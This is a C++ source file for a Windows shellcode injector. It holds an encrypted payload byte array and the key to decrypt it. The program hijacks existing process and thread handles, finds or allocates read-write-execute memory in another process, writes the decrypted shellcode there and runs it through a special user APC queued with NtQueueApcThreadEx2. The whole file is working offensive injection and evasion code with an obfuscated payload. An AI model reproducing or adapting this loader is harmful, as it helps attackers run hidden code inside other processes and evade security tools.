#include <iostream>
#include <Windows.h>
//#include <Psapi.h>
#include <deque>
#include <tlhelp32.h>
#include "Shcd.h"
//#include <winternl.h>
#include "MapFreeMemoryObjects.h"
#include "ProcessThreadPair.h"
#include "RWXFinder.h"
#include "InjectionCandidate.h"

#pragma comment(lib, "ntdll.lib")

typedef PVOID PPS_APC_ROUTINE;

typedef NTSTATUS(NTAPI* pNtQueueApcThreadEx2_FIXED)(
	_In_ HANDLE ThreadHandle,
	_In_opt_ HANDLE ReserveHandle,
	_In_ ULONG ApcFlags,
	_In_ PPS_APC_ROUTINE ApcRoutine,
	_In_opt_ PVOID ApcArgument1,
	_In_opt_ PVOID ApcArgument2,
	_In_opt_ PVOID ApcArgument3
	);

unsigned char executableCode[] = "\x72\x10\x00\x00\xac\x5d\x00\x00\x5b\x76\x00\x00\x69\x17\x00\x00\xf3\x0a\x23\x57\xb5\x05\xef\x6b\x21\x6a\xfd\x7d\x9e\x9c\x22\x4a\xe5\x9c\x11\xf7\x2e\x63\x2b\xc9\x88\x08\xf9\x2e\x52\x53\x3c\xec\x3b\x74\x34\xa1\x10\xa7\x6a\x9e\xf9\x4d\xe9\xd7\xf6\x61\xb3\x33\xe6\xbb\xb7\xb5\xc1\x79\xe5\x55\xeb\xe2\xa7\xf3\x7a\xcb\x03\xf6\x73\x44\x77\x0f\x53\x85\x8e\xc8\x4a\x9c\x27\x82\x81\x24\x69\xc8\x3e\x9f\x84\xdd\x60\xb2\x44\xbe\x44\x27\x93\x2a\xbd\x46\x4e\x23\xd2\xe6\x9c\xe8\xc0\xb0\x55\xec\x0d\x29\x01\xce\x2c\x51\xa5\xc6\x64\x7e\xb7\x6e\x24\x16\x85\x99\x62\x69\x68\x12\xb7\x4d\x69\x47\x4a\x4e\x2c\xd9\xd9\x66\x1a\xac\x49\x68\xf2\x71\xc9\x37\xb5\xdb\xda\xec\x76\x17\x44\x41\x55\xc7\xb5\x73\xf5\xaa\xb9\xe6\xc2\x93\x9f\x25\xac\x1d\x4d\x11\x60\xfc\xf5\xfb\xbc\x83\x63\x6f\xb8\x5f\x01\x19\x98\x4b\x30\x61\x1f\x26\x5d\x30\xed\x3c\x10\xe6\x2b\x5d\x2b\xcc\x22\x53\x22\x1c\x7c\x77\x54\x3a\x75\xdb\x4b\x9f\x55\x14\xee\x6a\xbe\xf3\x58\xc4\x50\x83\xd6\xe9\xb5\x57\x85\x34\x45\x98\x49\xe8\xac\x74\xf1\x84\xa0\xf5\x46\xca\x6a\x96\x47\xec\x51\xce\x70\x3d\x23\x1f\x98\x81\xec\xf1\x08\x62\x61\x8f\x0f\xdc\xf9\xd2\xbb\xdb\xd0\xca\x09\x83\x1c\x71\xb8\x8a\xf8\xef\xe2\x23\x43\x2c\x1a\x1f\x0b\x28\x0c\x38\xfe\xa0\xaf\xf3\xfa\x7a\xbc\xfb\xbf\x31\x0c\xb4\xae\x28\x90\xee\x99\x1d\x50\x5f\x77\xd6\xb5\x1a\x44\x0c\x32\x93\xec\xad\x25\x8d\xba\x9c\x8c\xb1\xc6\xcc\x2d\x56\x8f\x56\xcc\x9e\xc7\x10\x94\x91\x86\x66\x64\xb7\x42\x58\x42\x06\x25\x0b\x0d\x10\x8b\x84\x22\x9b\x87\x6a\xee\x7e\xab\xcc\xb2\xa0\x22\x6c\x5d\xaa\x57\xca\xe3\x5a\x94\x4a\x69\xf3\xfd\x09\xe0\x2c\xee\x1d\x78\x9e\xd3\xd2\xad\xf5\x2d\xdb\x07\x46\xb6\xb8\xc0\x0d\xf8\xb8\xd1\x16\x21\xa6\x4c\xfb\x80\x2b\x99\xf9\xcd\x16\x07\x4e\xe0\xd9\x7b\xb4\xbf\x7b\x9b\x95\xcf\x6b\xd6\xcc\x09\xa8\x8b\xad\xcf\xe9\x44\x95\xb1\xad\x55\x0b\x74\x9a\x67\x6a\x54\x0b\x36\x53\xb4\x61\xcc\xec\x44\x83\x22\xbd\x2e\x48\x1b\x4f\xb3\x3f\xa5\xd7\x25\x2e\x64\x09\xb1\xb8\x18\xce\x05\x2e\x23\xd0\xb5\x83\x6e\xd5\x3b\x26";


SIZE_T shellcodeSize = sizeof(executableCode);

HANDLE getFirstThreadHandleByPID(int pid) {
	HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	THREADENTRY32 te32;
	te32.dwSize = sizeof(THREADENTRY32);
	if (Thread32First(hThreadSnap, &te32) != FALSE) {
		while (Thread32Next(hThreadSnap, &te32) != FALSE) {
			if (te32.th32OwnerProcessID == pid) {
				CloseHandle(hThreadSnap);
				return OpenThread(THREAD_QUERY_LIMITED_INFORMATION | THREAD_SET_CONTEXT, FALSE, te32.th32ThreadID);
			}
		}
	}
	CloseHandle(hThreadSnap);
	return NULL;
}

int main(){
    // 1. Find a opened process
    MapMemoryObjects memoryObjects = MapMemoryObjects();
    PSYSTEM_HANDLE_INFORMATION memoryObjectList = memoryObjects.MapMemoryHandlers();
	deque<ProcessThreadPair> threads = memoryObjects.FindProcessThreadPairs(memoryObjectList, PROCESS_VM_WRITE | PROCESS_QUERY_LIMITED_INFORMATION, THREAD_SET_CONTEXT);

	if (threads.size() == 0) {
		std::cout << "No processes + thread with required access found." << std::endl;
		// If no pair found, just use a process with required access, and then open manually a thread in it
		deque<HANDLE> processes = memoryObjects.FilterProcesses(memoryObjectList, PROCESS_VM_WRITE | PROCESS_QUERY_LIMITED_INFORMATION);
		if (processes.size() == 0) {
			std::cout << "No processes with required access found." << std::endl;
			return 1;
		}
		for (const auto& processHandle : processes) {
			HANDLE threadHandle = getFirstThreadHandleByPID(GetProcessId(processHandle));
			if (threadHandle != NULL) {
				ProcessThreadPair pair;
				pair.hProcess = processHandle;
				pair.hThread = threadHandle;
				pair.processId = GetProcessId(processHandle);
				pair.threadId = GetThreadId(threadHandle);
				threads.push_back(pair);
				std::cout << "Found process + thread with required access: PID " << pair.processId << " | TID " << pair.threadId << std::endl;
				break;
			}
		}
	}
	for (const auto& pair : threads) {
		std::cout << "Found process with required access: PID " << pair.processId << " | TID " << pair.threadId << std::endl;
	}

	// 2. Find a RWX memory region in the opened process
	InjectionCandidate candidate;
    bool found = false;
	bool firstTimeHere = false;
    for(const auto& pair : threads) {
        std::cout << "Process ID: " << pair.processId << " | Thread ID: " << pair.threadId << std::endl;
		candidate.processId = pair.processId;
		candidate.threadId = pair.threadId;
		candidate.hProcess = pair.hProcess;
		candidate.hThread = pair.hThread;
        LPVOID rwx = FindRWX(pair.hProcess, shellcodeSize);
        if (rwx) {
            std::cout << "Found RWX memory at: " << rwx << std::endl;
			candidate.rwxAddress = rwx;
			
			found = true;
			std::cout << "Using process ID: " << candidate.processId << " | Thread ID: " << candidate.threadId << " and RWX address: " << candidate.rwxAddress << std::endl;
            break;
        } else {
            std::cout << "No RWX memory found in process." << std::endl;
		}
	}
	if (!found) {
		// If no RWX memory found, allocate some
        std::cout << "No RWX memory regions found in any opened processes." << std::endl;
		
		LPVOID rwx = VirtualAllocEx(candidate.hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (rwx) {
			std::cout << "Allocated RWX memory at: " << rwx << std::endl;
			candidate.rwxAddress = rwx;
			found = true;
		}
		else {
			DWORD err = GetLastError();
			std::cout << "Failed to allocate RWX memory in process. Error: "
				<< err << std::endl;
			return 1;
		}
    }

	//2.1 Decrypt shellcode 
	unsigned char* payloadDec = decryptShellcode(executableCode, sizeof(executableCode), "f7Ea9C2b4D10xL8zQ5Wk3P6rIeG0jN7o");
	SIZE_T payloadDecLen = sizeof(executableCode);

    // 3. Write shellcode to the RWX memory region
	SIZE_T bytesWritten;
	WriteProcessMemory(candidate.hProcess, candidate.rwxAddress, payloadDec, payloadDecLen, &bytesWritten);
	
    // 4. Execute the shellcode with a openend thread using NtQueueApcThreadEx2
	using resolvedNtQueueApcThreadEx2 = NTSTATUS(NTAPI*)(
		HANDLE ThreadHandle,
		HANDLE ReserveHandle,
		ULONG ApcFlags,
		PPS_APC_ROUTINE ApcRoutine,
		PVOID ApcArgument1,
		PVOID ApcArgument2,
		PVOID ApcArgument3
		);

	resolvedNtQueueApcThreadEx2 fNtQueueApcThreadEx2 = (resolvedNtQueueApcThreadEx2)(GetProcAddress(GetModuleHandleA("ntdll"), "NtQueueApcThreadEx2"));
	DWORD res = fNtQueueApcThreadEx2(candidate.hThread, NULL, QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC,
		(PPS_APC_ROUTINE)candidate.rwxAddress, NULL, NULL, NULL);

	
	cout << "NtQueueApcThreadEx2 result: " << hex << res << endl;
	return 0;
}
